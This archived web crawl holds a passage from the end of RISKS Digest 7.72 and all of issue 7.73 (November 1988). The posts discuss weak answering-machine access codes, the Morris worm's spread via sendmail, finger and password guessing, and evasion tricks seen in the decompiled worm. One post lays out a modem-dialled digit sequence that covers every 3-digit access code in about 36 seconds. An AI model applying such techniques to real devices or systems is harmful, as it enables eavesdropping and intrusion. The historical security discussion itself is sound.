&gt;   (3) Have there been any incidents of remote sabotage of answering machines,
&gt;   	or, worse, criminal interception of messages, or bugging, as I describe
&gt;   	above?

During the latest election campaign here, one of the major parties set up
several answering machines for political messages, e.g.  "if you want to know
why you should vote for us, dial 555-1234".  They were very surprised when they
found out that the messages have been changed, (not in their favor of course).

The machines  were rented  from a  company that lets  users have  only a
phone  number to  call to,  and an  access code;  so the  only way  such
messages may have been altered is by remote control.

Amos Shapir, National Semiconductor (Israel) P.O.B. 3007, Herzlia 46104, Israel

</PRE>
<HR><H3><A NAME="subj6.2">
re: risks in answering machines (revisted)
</A>
</H3>
<address>
Gordon Meyer                                     
&lt;<A HREF="mailto:TK0GRM1@NIU.BITNET">
TK0GRM1@NIU.BITNET
</A>&gt;
</address>
<i>
Wed, 02 Nov 88 12:38 CST
</i><PRE>

Andy Glew expresses some concerns about the security of telephone answering
machines.  I too have these concerns, and have had some problems along these
lines with my answering machine at home.  It is an older Cobra model.
Manufactured in about 1982 it offers remote message retrieval with the use of a
tone generating device.  The remote control device is a pain to use...you have
to carry it around with you, and past experiments have shown that tone units
from other machines will work just as well as the one the company provides! A
friend of mine had a similar machine, of another brand, and our remote controls
worked interchangably.  Also, I did a little experimenting and found that I
could activate both our machines by using a sweeping tone generated by my home
computer.

About six months ago I had a problem with an unknown person calling my machine
and listening to my messages.  There was no way I could disable this option,
but there is a switch that prevents outside callers from erasing the messages
after listening to them.  There is no option to change outgoing messages and
the like so that is not a concern with this machine.  Luckily I have since
moved and the new phone number has stopped these outside invasions of my
privacy.

A back issue of 2600 Magazine had a short editorial on this subject.
Their response to the uncaring attitude of the manufacturer was to
call the company at night, (the company was using their own machines
to man the phones at night) and change the outgoing message to one
warning others about the lack of security on the product.

Gordon R. Meyer,  Dept of Sociology, Northern Illinois University.

</PRE>
<HR><H3><A NAME="subj6.3">
Re: RISKS DIGEST 7.68 (Answering machines)
</A>
</H3>
<address>
Bob Felderman
&lt;<A HREF="mailto:feldy@ats.ucla.edu ">
feldy@ats.ucla.edu 
</A>&gt;
</address>
<i>
Mon, 31 Oct 88 18:38:24 PST
</i><PRE>

The cobra AN-8500 allows ONLY remote listening to messages and has a switch on
the machine which determines whether msgs will be erased after being heard
remotely.  Unfortunately, the code for remote listening is one (1) factory
preset digit.

Bob Felderman                   	         feldy@cs.ucla.edu
UCLA Computer Science   	...!{rutgers,ucbvax}!cs.ucla.edu!feldy

</PRE>
<HR><H3><A NAME="subj6.4">
 re: Risks in Answering Machines (revisited)
</A>
</H3>
<address>
GREENY 
&lt;<A HREF="mailto:MISS026@ECNCDC.BITNET">
MISS026@ECNCDC.BITNET
</A>&gt;
</address>
<i>
Mon 07 Nov 1988 00:56 CDT
</i><PRE>

&gt; Are there any machines on the market.....

Well, the one that I have (mainly for cost reasons, since I'm just an
undergrad) is a Phonemate.  Basically, it answers the phone, plays my digitally
recorded message, and takes the message.....then when I come home I can listen
to them.

About the only thing that it does remotely is answer the phone, and get my
messages.  Although it does allow one to turn it on (if its accidently let
off) from a remote location by letting the phone ring 15 times or more (it will
pick up and play the message to let you know that it is on.....).

After being on RISKS for a few years, I have realized that the convience
realized by a completely remote machine is not worth the risks.  I suppose
I could always go to voice mail, or hire a secretary if I needed one....

&gt; Is there any machines out there w/o the remote erase....

What's the big deal?  The machine *usually* has a cassette, in it, and assuming
that it wont do a remote rewind of the cassette after playback, all one would
have to do to disable the erase circuit would be to install a small switch in
series with the erase head....when you go out, flip it off when you come back
in and want to erase -- flip it on.  GEtting a copy of the schematics would be
helpful if possible so that you could disable the entire circuit thereby
preventing the thing from rewinding w/o erasing and then taping over the
messages....perhaps a circuit that would prevent erasure during rewind (the way
they usually work) so that you could play them back but not erase em (i.e. it
wouldnt rewind or erase if you selected erase with the "switch" off....

Shouldn't be too much of a hassle if you are somewhat knowledgeable in
electronics.....or if you arent -- try to find a hungry student in electronics
and offer PIZZA! :-&gt;

Greeny

Bitnet: miss026@ecncdc
Internet:miss026%ecncdc.bitnet@cunyvm.cuny.edu
Disclaimer: I ain't responsible for nothing you or anyone else does...so
     don't blame me....

</PRE>
<HR><H3><A NAME="subj6.5">
 Re: Risks in Answering Machines
</A>
</H3>
<address>
&lt;<A HREF="mailto:Curtiss@DOCKMASTER.ARPA">
Curtiss@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Wed, 2 Nov 88 14:03 EST
</i><PRE>

In RISKS 7.68, Andy "Krazy" Glew asks if there are any answering machines
with redefinable passwords that are long enough for an acceptable level of
security and if any have only non-destructive remote commands.  One possible
solution is an "answering machine card" for a PC.  Essentially, it is a
complete telephone interface, capable of recognizing touch tones, recording
and playing digitized speech (stored on a hard disk or floppy) and acting as
a modem.  A program is usually included with the board that makes it
function as an answering machine.  Since the full power of a complete
computer is available, the user can create any kind of password scheme they
desire, including multi-level menus for leaving messages for specific
people.  Also, the program can be modified to eliminate destructive remote
commands and new functions can be added.  They can even be set up to call
people, delivering a pre-recorded message (ala, computer cold calling).

There are two such boards available, that I know of.  Either can be had for
about $250, not much more than a full featured, top-of-the-line dedicated
machine.

I'm not quite sure that this is a good solution to the problem, though.  Now
we have a potentially expensive machine attached to the phone line.  If
you're worried about losses to messages on a dedicated tape, just think
about the PC with one of these cards.
                                               William Curtiss

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Ultrasonic emissions a real problem
</A>
</H3>
<address>
Geoffrey Welsh 
&lt;<A HREF="mailto:izot@f171.n221.z1.fidonet.org">
izot@f171.n221.z1.fidonet.org
</A>&gt;
</address>
<i>
Mon, 07 Nov 88 18:13:29 EST
</i><PRE>
 
In <A HREF="/Risks/7.68.html">RISKS-7-68</A> eravin@dasys1.UUCP (Ed Ravin) writes:
 
&gt;I've got my own story to tell about high frequency noises crawling out of
&gt;computer related devices, and since I'm new to RISKS, my apologies if any
&gt;or all of this has been discussed before.
 
   I, too, am new to RISKS (drawn here by news of the ARPAnet worm), and I,
too, share your earitability. (sorry!)
 
   When I was much younger, I used to hear whistle sounds and I'd ask my
parents what they were. They immediately took me to the doctor, who told
them that I did *not* have an ear infection. They stopped only short of taking
me to a neurologist to find out if something upstairs was shorting out.
 
&gt;After that I began noticing the sounds made by all the other CRT's in my
&gt;life. They were high pitched and slightly irritating, but not painful. I had
&gt;always, even before meeting computers, noticed the 15khz whine from a TV set,
&gt;but it had never bothered me.
 
   It didn't take me long to figure out that this was among the causes of the
noise I was hearing. I have also heard sounds which are distinctly higher
in pitch than a standard NTSC CRT (i.e. higher frequency than a 15,750 Hz
flyback transformer). I am puzzled as to exactly what these are as the only
things I know of that operate around 16 KHz RF are LORAN-type devices and, to
the best of my knowledge, I am near no such installations (e.g. the nearest
sizable body of water is a long drive from here).
 
&gt;Maybe my problem is that I never listened to loud rock music and my hearing
&gt;above 15khz is mostly intact.
 
   Here's the kicker: I HAVE listened to loud rock music. I have worked in
factories where a wide spectrum of loud noises assaults me for eight or twelve
hours at a time (with occasional breaks), but my inability to hear these high
frequencies clearly fades within an hour or so after I leave, leading me to
believe that that my decreased hearing sensitivity is more a muscle reaction
in my ear rather than damage cause by the volume.
 
   What, then, leads some of us to be sensitive to these frequencies to a
fault and others to be completely unaware of them? Worse, how can we determine
what levels are acceptable, given that some people are simply more sensitive
than others?
 
   If indeed ultrasonic emissions are a cause of illness or other unacceptable
consequences, it is vital that a study into the area be launched. Who knows;
in a few years we may find our present CRTs replaced with ones that have a
horizontal scan rate above 30 KHz to avoid this problem.

Geoffrey Welsh, 66 Mooregate Crescent, Suite 602, Kitchener, Ontario N2M 5E6 -
CANADA

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.71.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.73.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-25</DOCNO>
<DOCOLDNO>IA012-000131-B035-57</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.73.html 128.240.150.127 19970217023725 text/html 26956
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:35:50 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 73</TITLE>
<LINK REL="Prev" HREF="/Risks/7.72.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.74.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.72.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.74.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 73</H1>
<H2> Wednesday 9 November 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
The Computer Jam -- How it came about 
</A>
<DD>
<A HREF="#subj1.1">
John Markoff via Geoff Goodfellow
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Single-bit error transmogrifications 
</A>
<DD>
<A HREF="#subj2.1">
Robert D. Houk
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  New news from Hacker attack on Philips France, 1987 
</A>
<DD>
<A HREF="#subj3.1">
Klaus Brunnstein
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: Telephone answering machines 
</A>
<DD>
<A HREF="#subj4.1">
William Curtiss
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Fly by Light 
</A>
<DD>
<A HREF="#subj5.1">
Martyn Thomas
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  WORM/VIRUS DICUSSION:
</A>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Decompiled viruses 
</A>
<DD>
<A HREF="#subj7.1">
Dave Pare
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Worms/viruses/moles/etc. and the risk of nuclear war 
</A>
<DD>
<A HREF="#subj8.1">
Clifford Johnson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  The Worm 
</A>
<DD>
<A HREF="#subj9.1">
Vince Manis
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
NYT/Markoff: The Computer Jam -- How it came about
</A>
</H3>
<address>
the tty of Geoff Goodfellow
&lt;<A HREF="mailto:geoff@fernwood.mpk.ca.us ">
geoff@fernwood.mpk.ca.us 
</A>&gt;
</address>
<i>
Tue, 8 Nov 88 21:40:00 PST
</i><PRE>

THE COMPUTER JAM: HOW IT CAME ABOUT
By JOHN MARKOFF
c.1988 N.Y. Times News Service, 8-Nov-88

   Computer scientists who have studied the rogue program that crashed through
many of the nation's computer networks last week say the invader actually
represents a new type of helpful software designed for computer networks.
   The same class of software could be used to harness computers spread aroun
the world and put them to work simultaneously.
   It could also diagnose malfunctions in a network, execute large computations
on many machines at once and act as a speedy messenger.
   But it is this same capability that caused thousands of computers in
universities, military installations and corporate research centers to stall
and shut down the Defense Department's Arpanet system when an illicit version
of the program began interacting in an unexpected way.
   ``It is a very powerful tool for solving problems,'' said John F. Shoch, a
computer expert who has studied the programs. ``Like most tools it can be
misued, and I think we have an example here of someone who misused and abused
the tool.''
   The program, written as a ``clever hack'' by Robert Tappan Morris, a
23-year-old Cornell University computer science graduate student, was
originally meant to be harmless.  It was supposed to copy itself from computer
to computer via Arpanet and merely hide itself in the computers. The purpose?
Simply to prove that it could be done.
   But by a quirk, the program instead reproduced itself so frequently that the
computers on the network quickly became jammed.
   Interviews with computer scientists who studied the network shutdown and
with friends of Morris have disclosed the manner in which the events unfolded.
   The program was introduced last Wednesday evening at a computer in the
artificial intelligence laboratory at the Massachusetts Institute of
Technology. Morris was seated at his terminal at Cornell in Ithaca, N.Y., but
he signed onto the machine at MIT.  Both his terminal and the MIT machine were
attached to Arpanet, a computer network that connects research centers,
universities and military bases.
   Using a feature of Arpanet, called Sendmail, to exchange messages among
computer users, he inserted his rogue program. It immediately exploited a
loophole in Sendmail at several computers on Arpanet.
   Typically, Sendmail is used to transfer electronic messages from machine to
machine throughout the network, placing the messages in personal files.
   However, the programmer who originally wrote Sendmail three years ago had
left a secret ``backdoor'' in the program to make it easier for his work. It
permitted any program written in the computer language known as C to be mailed
like any other message.
   So instead of a program being sent only to someone's personal files, it
could also be sent to a computer's internal control programs, which would start
the new program. Only a small group of computer experts _ among them Morris _
knew of the backdoor.
   As they dissected Morris's program later, computer experts found that it
elegantly exploited the Sendmail backdoor in several ways, copying itself from
computer to computer and tapping two additional security provisions to enter
new computers.
   The invader first began its journey as a program written in the C language.
But it also included two ``object'' or ``binary'' files -- programs that could
be run directly on Sun Microsystems machines or Digital Equipment VAX computers
without any additional translation, making it even easier to infect a computer.
   One of these binary files had the capability of guessing the passwords of
users on the newly infected computer. This permits wider dispersion of the
rogue program.
   To guess the password, the program first read the list of users on the
target computer and then systematically tried using their names, permutations
of their names or a list of commonly used passwords. When successful in
guessing one, the program then signed on to the computer and used the
privileges involved to gain access to additonal computers in the Arpanet
system.
   Morris's program was also written to exploit another loophole. A program on
Arpanet called Finger lets users on a remote computer know the last time that a
user on another network machine had signed on. Because of a bug, or error, in
Finger, Morris was able to use the program as a crowbar to further pry his way
through computer security.
   The defect in Finger, which was widely known, gives a user access to a
computer's central control programs if an excessively long message is sent to
Finger. So by sending such a message, Morris's program gained access to these
control programs, thus allowing the further spread of the rogue.
   The rogue program did other things as well. For example, each copy
frequently signaled its location back through the network to a computer at the
University of California at Berkeley. A friend of Morris said that this was
intended to fool computer researchers into thinking that the rogue had
originated at Berkeley.
   The program contained another signaling mechanism that became its Achilles'
heel and led to its discovery. It would signal a new computer to learn whether
it had been invaded. If not, the program would copy itself into that computer.
   But Morris reasoned that another expert could defeat his program by sending
the correct answering signal back to the rogue. To parry this, Morris
programmed his invader so that once every 10 times it sent the query signal it
would copy itself into the new machine regardless of the answer.
   The choice of 1 in 10 proved disastrous because it was far too frequent. It
should have been one in 1,000 or even one in 10,000 for the invader to escape
detection.
   But because the speed of communications on Arpanet is so fast, Morris's
illicit program echoed back and forth through the network in minutes, copying
and recopying itself hundreds or thousands of times on each machine, eventually
stalling the computers and then jamming the entire network.
   After introducing his program Wednesday night, Morris left his terminal for
an hour. When he returned, the nationwide jamming of Arpanet was well under
way, and he could immediately see the chaos he had started. Within a few hours,
it was clear to computer system managers that something was seriously wrong
with Arpanet.
   By Thursday morning, many knew what had happened, were busy ridding their
systems of the invader and were warning colleagues to unhook from the network.
They were also modifying Sendmail and making other changes to their internal
software to thwart another invader.
   The software invader did not threaten all computers in the network. It was
aimed only at the Sun and Digital Equipment computers running a version of the
Unix operating system written at the University of California at Berkeley.
Other Arpanet computers using different operating systems escaped.
   These rogue programs have in the past been referred to as worms or, when
they are malicious, viruses. Computer science folklore has it that the first
worms written were deployed on the Arpanet in the early 1970s.
   Researchers tell of a worm called ``creeper,'' whose sole purpose was to
copy itself from machine to machine, much the way Morris's program did last
week. When it reached each new computer it would display the message: ``I'm the
creeper. Catch me if you can!''
   As legend has it, a second programmer wrote another worm program that was
designed to crawl through the Arpanet, killing creepers.
   Several years later, computer researchers at the Xerox Corp.'s Palo Alto
Research Center developed more advanced worm programs.  Shoch and Jon Hupp
developed ``town crier'' worm programs that acted as messengers and
``diagnostic'' worms that patrolled the network looking for malfunctioning
computers.
   They even described a ``vampire'' worm program. It was designed to run very
complex programs late at night while the computer's human users slept. When the
humans returned in the morning, the vampire program would go to sleep, waiting
to return to work the next evening.

      [Please keep any responses short and to the point. PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Single-bit error transmogrifications
</A>
</H3>
<address>
Robert D. Houk
&lt;<A HREF="mailto:houk@sli ">
houk@sli 
</A>&gt;
</address>
<i>
Tue, 8 Nov 88 13:50:34 EST
</i><PRE>

  [This started out with a question from Robert on mutations.  My answer
  to him (not in RISKS) included this fragment:
    In general, the difference between killer and benign could be one bit.  The
    ARPANET crash of 27 Oct 1980 resulted from bits accidentally being dropped
    in the time stamp of one status word. ...  PGN]

Another example of a one-bit error that escaped all error-detection to wreak
havoc: A DQ-11 [am I dating myself?] would very occasionally (every month or
so) drop a leading "0" bit at the begining of a message it was transmitting
(this being a DDCMP protocol point-to-point network called "ANF-10" running
under the TOPS-10 operating system). If this bit stream happened to also end
in a "0" bit, the net effect was to "left-shift" the entire message by one
bit. This not only slipped by the CRC checks, it resulted in a
legally-formatted message as well! In particular, a random data message was
transmogrified into a network protocol START message. The receiving node saw
the START, and did the normal communications restart, including sending the
START-ACK to the other side, which promptly went ??WHAT??, took its line
down, and restarted communications with a real START message. The net effect
(for this particular customer/network) was an out-of-the-blue transient
network partitioning (they had no alternate routing paths, so all user
connections were lost in the partitioning), with no errors detected or
reported anywhere to account for it!

Now, while we were all pretty amused (yea, even amazed) at such arcana,
I recall the customer being more of the opinion that it was a "killer"
and not all that amusing. A new DQ-11 fixed the problem.
                             			            -RDH

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
New news from Hacker attack on Philips France, 1987
</A>
</H3>
<address>
Klaus Brunnstein 
&lt;<A HREF="mailto:brunnstein%rz.informatik.uni-hamburg.dbp.de@RELAY.CS.NET">
brunnstein%rz.informatik.uni-hamburg.dbp.de@RELAY.CS.NET
</A>&gt;
</address>
<i>
07 Nov 88 12:49 GMT+0100
</i><PRE>

A German TV magazine reported (last week) that the German hackers which
attacked, in summer 1987, several computer systems and networks (including
NASA, the SPANET, the CERN computers which are labeled `European hacker
center', as well as computers of Philips France and Thompson-Brandt/France) had
transferred design and construction plans of the MegaBit chip having been
developed in the Philips laboratories.  The only information available is that
detailed graphics are available to the reporters showing details of the MegaBit
design.

Evidently it is very difficult to prosecute this data theft since German law
does not apply to France based enterprises. Moreover, the German law may
generally not be applicable since its prerequit may not be true that PHILIPS'
computer system has `special protection mechanisms':  evidently, the system was
only be protected with UID and password, which may not be a sufficient
protection (and was not).

Evidently, the attackers had much more knowledge as well as instruments (e.g.
sophisticated graphic terminals and plotters, special software) than a `normal
hacker' has. Speculations are that these hackers were spions rather than
hackers of the CCC which was blamed for the attack.  Moreover, leading members
of CCC one of whom was arrested for the attack, evidently have not enough
knowledge to work with such systems.

Klaus Brunnstein, Hamburg, FRG

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
 Re: Telephone answering machines
</A>
</H3>
<address>
&lt;<A HREF="mailto:Curtiss@DOCKMASTER.ARPA">
Curtiss@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Wed, 9 Nov 88 09:18 EST
</i><PRE>

In <A HREF="/Risks/7.69.html">RISKS-7.69</A> Vince Manis states that his answering machine has an 8-bit
octal security code for a search space of 256.  He is not worried about
someone breaking into his machine since "people aren't patient enough to
call a number 256 times just to break in." Well, someone who is really
determined would and with a computer and War Games dialer it even wouldn't
be that terrible.  However, even that is not necessary.  Only TWO phone
calls should be sufficient.  Most answering machines do not care about wrong
access codes or noise around a correct one -- they just ignore the extra
digits.  As long as the incoming stream contains the code somewhere you are
given access.  Since 256 in octal needs three digits, a carefully
constructed string of 258 digits will contain every possible combination
(for example, if the code is a triplet composed of just the numbers 1 and 2
then the string 1211122212 contains all eight triplets).  Since the normal
true-tone phone generates a pulse 70 milliseconds long with inter-digit
spacing of the same (some phones continue generating the tone as long as the
digit is held down, but these are near the minimum -- perhaps someone more
knowledgeable in the matter can provide us with the guaranteed minimum) or
7.14 digits per second.  So, I only need just over 36 seconds to try all
codes.  Since your machine might not be this patient, I could do it in two
18 second calls.  Of course, I can't dial this fast, but my modem can.

William Curtiss

    [And there is a large literature on polynomially generated shift-register
    sequences that have the desired property.  I would say that is a rather
    vulnerable design for use in sensitive applications, but perhaps adequate
    if you have no secrets to hide and would not be concerned with maliciously 
    deleted messages.  Note that denials of service -- e.g., total saturation
    of our answering machine tape -- can be achieved without access to the 
    security code.  PGN]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Fly by Light
</A>
</H3>
<address>
Martyn Thomas 
&lt;<A HREF="mailto:mct@praxis.UUCP">
mct@praxis.UUCP
</A>&gt;
</address>
<i>
Mon, 7 Nov 88 13:02:42 BST
</i><PRE>

Flight International (November 5th 1988) reports the successful maiden
flight on October 23rd of the Airship Industries Skyship 600-04 - which uses
the world's first full-authority fly-by-light flight control system.

The fly-by-light system, developed by GEC Avionics, uses fibre-optics, which
are highly resistant to electromagnetic interference and lightening strikes.

Martyn Thomas				!uunet!mcvax!ukc!praxis!mct

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
decompiled viruses
</A>
</H3>
<address>
Dave Pare 
&lt;<A HREF="mailto:mr-frog@fxgrp.UUCP">
mr-frog@fxgrp.UUCP
</A>&gt;
</address>
<i>
Fri, 4 Nov 88 17:22:33 PST
</i><PRE>

Last night a massive effort to decompile the "internet virus" was made
by half a dozen people working at the CSRG in Berkeley.  Most of the code
is complete now, and most of the guesses that people have made were right
on insofar as how it works, what it targets, and how it is distributed.

Precautions were taken by the author to clean up intermediate files, to
use XOR functions on program strings, repeated forks, making many static
procedures and using the linker to remove (presumably) suspicious-looking
procedure names, naming the program "sh", etc, in order to better protect
the program from detection and identification.  This was definitely a
deliberate action; quite a number of precautions were taken to hide the
process.

The program was also fairly sophisticated in concept.  It doesn't appear
that the primary *motivation* of the author was the overloading of the
target machine.  There were several bugs encountered during decompilation,
(most notably a "bzero(foo, sizeof(foo))", where foo is a struct) which
may have accounted for the program's obnoxious and apparently unintentional
behavior.

In my opinion, had the author tested this program more completely,
it would have been quite a while longer before it was detected.  While
this incarnation of the program was a serious nuisance, a correctly-working
version would have been far more insidious.  It would have required a
very curious system manager to notice an "innocuous" daemon listening to
an unusual internet port number, or strange-looking messages in the
sendmail syslog.

When someone who really knows how to code finally writes one of these
things, we may never find out about it until weeks or months later.
Although this program doesn't modify existing programs on affected systems,
future ones might -- heck, they may have already done so.

Dave Pare

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Worms/viruses/moles/etc. and the risk of nuclear war
</A>
</H3>
<address>
"Clifford Johnson" 
&lt;<A HREF="mailto:GA.CJJ@Forsythe.Stanford.EDU">
GA.CJJ@Forsythe.Stanford.EDU
</A>&gt;
</address>
<i>
Mon,  7 Nov 88 18:44:33 PST
</i><PRE>

&gt;  From: Brad Templeton &lt;brad%looking.uucp@RELAY.CS.NET&gt;
&gt;    People are talking as though there's some
&gt;  surprising end-of-the-world potential in this event...
&gt;  University systems are designed, and should be designed as
&gt;  low-caution, high convenience systems...  The press
&gt;  will want sensationalistic answers, but if you're talking to
&gt;  them, try to steer them away from all the comments about
&gt;  "War Games."

I was interviewed specifically on whether the worm illustrated a potential
cause of nuclear Armageddon.  (Bay Area TV Channel 7 (ABC), 11pm news Nov.4,
lead story.)  My answer was a qualified affirmative, and I think an unqualified
negative irresponsible.  Directly asked whether "War Games" was a good analogy,
I responded that things were generally headed that way but that the Vincennes
shootdown was a closer analogy to the present parlous state.  (The Pentagon
having concluded that no person was at fault for the mistaken shootdown, the
cause was by default computer-related error.)

In some circumstances, a computer virus/worm could be a determinative factor
precipitating a nuclear strike.  Nuclear command and control computerization
involves two functionally distinct sets of systems: (a) those for *executing* a
nuclear attack a la SIOP recipes; (b) those for *prompting* a strike by
informing the military (or political) leaders that an attack should be
launched, which includes notice of (predefined) preemptive and launch on
warning contingencies.

Execute command systems could be relatively closed; and hence are, or could be
managed so as to be, relatively secure.  Nevertheless, it gives pause that the
system requires that underground officers respond immediately if valid launch
codes are suddenly received through electronic communication channels.  Note
well that message traffic processed in the launch control capsules has greatly
increased in recent years.

Re the strategic and tactical warning systems, they are already based on
networked/workstation systems, i.e. the IDHS (Intelligence Data Handling
System), and DEFSMAC, which link the CIA, NSA, DIA, JCS, NORAD, and SIOP-CINCS.
These are of the same ilk as Arpanet/Milnet, and access is very wide, albeit
not public.  Intelligence-gathering/data-fusion by its function requires a
network open to diverse and disparate inputs, and so is vulnerable to
disruption/confusion by viruses/worms et alia.  While such systems may be
impervious to telenet attack, and while published "bugs" like the UNIX debug
option may be foreclosed in them, the potential for implanting subtle
bugs/traps in the software is plain, and that is but one potential source of
error.  Infiltration of software companies/military programming seems easy and
suggests *real* espionage possibilities that are frightening in their scope and
mulitplicity.  Also frightening is that the apparent failure of nodes in the
tactical warning net is interpreted as notice that those nodes may have been
destroyed in a nuclear attack.  (NORAD and other testimony admits this.)  There
is manifestly the potential for accidental/malicious net malfunctions causing a
catastrophic nuclear panic.

As for the trends, despite first appearances, the "Star Wars" system would
greatly add to U.S. vulnerability rather than to security by resting U.S.
strategic execution (as well as warning) upon a huge network of systems, much
harder to secure than the present execution system.  The warning system also
becomes much more complex.  The funded National Test Bed is in essence the
development of such vulnerable networks for strategic warning and execution.

The pace of technology is not the *imperative* that the military claim must be
followed so as to sustain deterrence.  The probable futility of plugging holes
in vast computer networks is at least as vital a message as the message that
known holes can be effectively patched.  The fact that the military widely use
complex networks in nuclear planning means that a most urgent lesson is that we
must avoid critical reliance on them, not merely that we should carry on under
the placebo of plugging what holes are identified.

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
The Worm
</A>
</H3>
<address>
Vince Manis
&lt;<A HREF="mailto:manis@grads.cs.ubc.ca ">
manis@grads.cs.ubc.ca 
</A>&gt;
</address>
<i>
Mon, 7 Nov 88 07:56:14 PST
</i><PRE>

Our site apparently didn't get hit, because our newly installed NSFnet router
has been so flaky that it has been unusable. Just goes to show, I guess.

I was struck by the fact that the biggest hole was the `debug' option in
sendmail. Since it has been well-known for about 15 years that allowing
anonymous remote execution is a tremendous danger, and since (I assume)
sendmail, in the standard distribution, comes with it disabled, one has to ask
why SA's were enabling it. I'm not entirely sure that all the blame should go
to the worm's author (putatively Mr Morris).

If the assumption in the previous paragraph is false, then perhaps UCB,
Sun, and Mt Xinu (among others) are at least morally culpable, too. 

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.72.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.74.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
